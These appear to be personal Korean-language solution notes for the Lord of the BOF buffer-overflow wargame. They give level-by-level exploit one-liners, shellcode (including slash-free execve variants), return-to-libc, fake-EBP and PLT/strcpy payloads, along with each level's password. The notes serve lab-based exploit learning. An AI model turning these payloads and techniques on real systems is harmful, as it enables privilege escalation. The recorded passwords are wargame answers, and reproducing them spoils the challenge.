[LoB]

telnet -l gate 192.168.171.5

#include <stdio.h>
#include <stdlib.h>

int main(void) {
        printf("0x%x\n", getenv("SHELLCODE"));
}

SHELLCODE (환경변수 : \x90 * 15 + SHELLCODE) 
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

setreuid 

.global main

main:
        #setreuid(502,502)
        xor     %eax, %eax
        mov     $0x46, %al  # 70 setreuid syscall
        mov     $0x1f6, %bx # 502
        mov     $0x1f6, %cx # 502
        int     $0x80

/bin/bash2
[gate] ./gremlin `python -c 'print "\x90" * 260 + “환경변수 저장 주소”
pwd: hello bof world

[gremlin] ./cobolt $(python -c 'print "\x90" * 20 + "\x38\xfe\xff\xbf"')
pwd: hacking exposed
(환경변수: SHELLCODE) 

[cobolt] (python -c 'print "\x90" * 20 + "\x11\xff\xff\xbf"';cat) | ./goblin
pwd: hackers proof
(환경변수: SHELLCODE) 

[goblin] ./orc `python -c 'print "A" * 44 + "\xeb\xfc\xff\xbf"+ " " + "\x90" * 100 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80”

pwd: cantata

(\xeb\xfc\xff\xbf: argv[2] 주소)
argv[2] 값으로 접근 (break *main+194, x/100s $esp 로 두 번째 인자가 저장되는 주소 찾아서 접근)


[orc] ./wolfman`python -c 'print "A" * 44 + "\x87\xfd\xff\xbf"+ " " + "\x90" * 100 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80”
pwd: love eyuna

(\x87\xfd\xff\xbf: argv[2] 주소)
argv[2] 값으로 접근 (break *main+194, x/100s $esp 로 두 번째 인자가 저장되는 주소 찾아서 접근)

[wolfman] 
./darkelf `python -c 'print "A" * 44 + "\x67\xfd\xff\xbf"+ " " + "\x90" * 100 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80”
pwd: kernel crashed

(\x67\xfd\xff\xbf: argv[2] 주소)
argv[2] 값으로 접근 (break *main+194, x/100s $esp 로 두 번째 인자가 저장되는 주소 찾아서 접근)

[darkelf] 
./orgeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee `python -c 'print "A" * 44 + "\x24\xfd\xff\xbf"+ " " + "\x90" * 100 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80”

orgeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee 로 이름 바꾼 후 위와 동일하게 진행 
pwd: timewalker

[orge] ./$(python -c 'print "\x90" * 100 + “\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80”’) `python -c ‘print “A” * 44 + “\xcd\xfc\xff\xbf”’`

pwd: aspirin

[135자리 argv[0] 주소: 0xbffffcad]  
[\x2f 없는 SHELLCODE]
\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

.global main

main:
# execve("/bin/sh", 0x0, 0x0) ;

        xor     %eax, %eax
        push    %eax
        mov     $0x67722e2e, %esi
        add     $0x1010101, %esi
        push    %esi
        mov     $0x6e69622e, %edi
        inc     %edi
        push    %edi
        mov     %esp, %ebx
        push    %eax
        mov     %esp, %edx
        push    %ebx
        mov     %esp, %ecx
        mov     $0xb, %al
        int     $0x80

[troll] ./vampire `python -c 'print "A" * 44 + “\x48\x77\xfe\xbf” + “ “ + “\x90” * 100000 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80”’`

pwd: music world

핵심: argv[2]에 엄청 값을 많이 넣어 스택 주소가 0xbffff 형식을 방지 
0xbffe7748

[vampire] ./$(python -c ‘print “\x90” * 100 + “\x2f 없는 SHELLCODE”’) `python -c 'print "A" * 44 + "\xb0\xff\xff\xbf"'`

pwd: shellcoder

핵심: argv hunter 라도 argv[0] 값은 저장하고 있는 주소가 있으므로 파일명에 SHELLCODE 삽입

[skeleton] ./golem `python -c 'print "A" * 44 + "\x38\xf7\xff\xbf"'`
pwd: cup of coffee

—————STACK 다 사라졌을 때 —————

공유 라이브러리 활용 - ( -fPIC -shared )
프로그램이 시작될 때 이 프로그램에 의해서 적재되는 라이브러리
$ touch shared_lib.c
$ gcc -fPIC -shared -o $(python -c ‘print “\x90” *100 + “\x2f 없는 SHELLCODE”’) shared_lib.c

export LD_PRELOAD=/home/skeleton/$(python -c ‘print “\x90” * 100 + “\x2f 없는 SHELLCODE”’)

[golem] ./darknight `python -c ‘print “SHELLCODE” + “\x90” * 15 + “\x88”’`

pwd: new attacker

SFP Overflow 
함수의 1byte로 EBP 값을 변경하면 ebp + 4 값이 eip (호출 받은 함수의 종료 후 실행할 다음 명령어 주소) 값 인데 SHELLCODE가 담긴 buf 로 eip 값을 조작하여 쉘을 딴다. 

disas problem_child

[darkknight] ./bugbear `python -c 'print "\x90" * 44 + "\xe0\x8a\x05\x40" + "\x90" * 4 + "\xf9\xbf\x0f\x40"'`

pwd: new divide

RTL (Return-to-libc): NX bit 보호 기법 우회 
NX bit: Stack Segment 의 Execute 권한을 제한하여 스택에 SHELLCODE 를 삽입하여 return 주소를 overwrite 하더라도 공격이 적용되지 않는 경우 사용 
libc: 메모리에 미리 적재되어 있는 공유 라이브러리 이용하여 공격

Payload: dummy(40) + SFP(4) + system 함수 주소(4) + dummy(4) + /bin/sh 주소 (4) 

dummy (4) 이유: system 함수가 실행되고 난 후 실행되는 부분인데 쉘을 실행시키는게 목적이므로 dummy 값으로 채워줌 

eip주소 부분 -> system 함수의 주소 (change) 
ebp+4 부분은 인자가 존재해야하므로 /bin/sh 주소를 넘겨줌. 

p system 주소: 0x40058ae0 
/bin/sh 주소: 0x400fbff9

[/bin/sh address 찾는 C코드] 

#include <stdio.h>
#include <string.h>

int main(void) {
        long addr = 0x40058ae0;
        while(memcmp((void *) addr, "/bin/sh", 8)) {
                addr++;
        }
        printf("0x%x\n", addr);

        return 0;
}

[bugbear] ./giant "`python -c 'print "\x90" * 44 + "\x48\x9d\x0a\x40" + "\xe0\x8a\x05\x40" + "\x90" * 4 + "\xf9\xbf\x0f\x40"'`" 

Payload: Dummy(40) + SFP(4) + execve (4) + system(4) + Dummy(4) + /bin/sh(4)

pwd: one step closer

(gdb) p/x 0x40018000 (사용된 공유 라이브러리 주소) + 0x00091d48 (__execve address)

사용된 공유 라이브러리 주소: ldd 파일 | grep libc | awk ‘{print $4}’
Execute address: nm /lib/libc.so.6 | grep __execve | awk ‘{print $1}’
$1 = 0x400a9d48

execve: 0x400a9d48
system: 0x40058ae0
/bin/sh: 0x400fbff9

[/bin/sh address 찾는 C코드] 

#include <stdio.h>
#include <string.h>

int main(void) {
        long addr = 0x40058ae0;
        while(memcmp((void *) addr, "/bin/sh", 8)) {
                addr++;
        }
        printf("0x%x\n", addr);

        return 0;
}

[giant] ./assassin “`python -c ‘print “\x90” * 44 + “\x1e\x85\x04\x08"+"\xe0\x8a\x05\x40” + “\x90” * 4 + “\xf9\xbf\x0f\x40”’`” 

pwd: pushing me away

payload: Dummy(40) + SFP(4) + Main_ret_addr(4) + System(4) + Dummy(4) + /bin/sh_addr(4)  

[assassin] 

SFP 부분을 &buf -4 주소로 채우고 return 주소를 leave 주소로 채워 buf 시작 주소에 있는 주소 값을 return 하도록 하여 SHELL을 실행

pwd: no place to hide

"`python -c 'print "\x04\xfc\xff\xbf"+"\xe0\x8a\x05\x40" + "\x90" * 4 + "\xf9\xbf\x0f\x40"+"\x90"*24 + "\xfc\xfb\xff\xbf" + "\xdf\x84\x04\x08"'`"

payload: (&buf+4)(4) + "\xe0\x8a\x05\x40" + "\x90" * 4 + "\xf9\xbf\x0f\x40" + [SFP](&buf-4)(4) + leave_addr(4)

0xbffffc04: &buf+4
0xbffffc00: buf 시작주소 
0xbffffbfc: &buf-4 

0xbffffbfc
0x80484df: leave (main)
Fake EBP: EBP를 조작하여 leave-ret Gadget을 이용하여 IP (Instruction Pointer)를 조작하는 기법
(스택 주소와 라이브러리 주소를 덮어쓸 수 없을 때 사용) 

leave  -> mov esp ebp
                 pop ebp
ret -> pop eip 
	   jmp eip

eip = ebp + 4

[zombie_assassin] `python -c 'print "A" * 44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "A" * 4 + "\x08\xfc\xff\xbf" + "/bin/sh\x00"'`

payload: Dummy(40) + SFP(4) + DO(4) + GYE(4) + GUL(4) + YUT(4) + MO(4) + Dummy(4) + /bin/sh 주소 + “/bin/sh\x00” 

함수 주소 다음 위치는 함수가 종료되었을 때 실행되는 부분이기에 (함수1 주소) + (함수2 주소) 하면 함수1 실행 후 함수2가 실행된다. 

pwd: here to stay

DO = 0x80487ec
GYE = 0x80487bc
GUL = 0x804878c
YUT = 0x804875c
MO = 0x8048724

[succubus] 

PLT 공격 
Return 부분을 strcpy 주소로 채운 후 AAAA가 쓰여지게 된다. 이후 strcpy의 ret을 활용하여 source를 destination에 copy시켜 시스템 함수를 실행시킨다. 즉, source 부분에 시스템 함수가 쓰여진 주소를 입력하고 destination 부분에는 AAAA가 위치한 주소를 입력해준다. 

pwd: beg for me

payload: Dummy(40) + SFP(4) + strcpy_addr(4) + Dummy(4) + arg1(4)(48번째 주소) + arg2(4)(system 함수 쓰인 주소) + system(4)(함수 주소) 

Payload: Dummy(40) + SFP(4) + strcpy_addr(4) + Dummy(4) + arg1(4)(48번째 주소) + arg2(4)(SHELLCODE 환경변수)

./nightmare “`python -c 'print "\x90" * 44 + "\x10\x84\x04\x08" + "A" * 4 +"A" * 4 + "\xb0\xfb\xff\xbf"+"\x14\xfe\xff\xbf"'`" 

Strcpy addr: 0x08048410

[nightmare] (python -c ‘print “SHELLCODE” + "\x90" * 19 +"\x00\x50\x01\x40"'; cat) | ./xavius

pwd: throw me away

STDIN 공격 
Stdin 을 할 때 임시 버퍼가 존재한다. 임시 버퍼 주소를 구하여 return 주소에 넣어주자. 

x/10wx stdin 

임시 버퍼 주소: 0x40015000

[xavius] 
Remote Exploit 공격 







